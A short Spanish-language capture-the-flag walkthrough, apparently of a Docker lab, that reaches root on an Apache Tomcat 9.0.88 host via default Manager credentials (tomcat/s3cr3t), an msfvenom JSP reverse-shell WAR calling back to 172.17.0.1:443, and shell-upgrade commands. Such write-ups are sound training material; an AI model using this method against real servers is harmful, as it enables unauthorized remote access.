
![image](https://github.com/user-attachments/assets/d0eee424-55c4-47af-8a46-cb9500efbb77)

nmap: 8080

---
en la pagina: 172.17.0.2:8080 hay una  versión del de tomcat: # Apache Tomcat/9.0.88
como exploit a esa versión no encontré mucho, pero en la pagina hay un "manager apps"

![image](https://github.com/user-attachments/assets/8489fc06-5080-43b6-803b-d0aaef574de0)


en: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
buscamos las credenciales por default para poder entrar al "manager app"
intentamos con las credenciales

![image](https://github.com/user-attachments/assets/6f3bfbf0-bb14-48c1-bb7a-71101acce2f4)

> las credenciales: tomcat/s3cr3t

entramos al "manager app" con esas credenciales

encontramos la parte de WAR file to deploy, donde se suben archivos .war

![image](https://github.com/user-attachments/assets/38e15592-832a-4c5f-996e-0bcdcf2e1a19)

para poder tener una conexión RCE utilizamos: msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war

lo lanzamos y nos crea un:   revshell.war

![image](https://github.com/user-attachments/assets/973132b0-0212-4472-9b61-d4f0c763c3eb)


lo subimos en archivos "WAR" y luego lo cargamos

al subirlo aparece aquí: llamado /revshell

![image](https://github.com/user-attachments/assets/172fadd7-9f49-4382-8780-97003c4aff0f)


>colocamos el terminal en escucha y presionamos el archivo y estamos dentro ya como root!

![image](https://github.com/user-attachments/assets/bffb11dd-3dd1-4df3-844b-205beb224f66)


hacemos un "stty"

       - script /dev/null -c bash
       - stty raw -echo; fg
       - reset xterm
       - export SHELL=bash && export TERM=xterm
       - stty rows numero colums numero 

y quedara así:

![image](https://github.com/user-attachments/assets/fbdfd381-a7b5-4a87-9cef-48ba1f5e5e33)

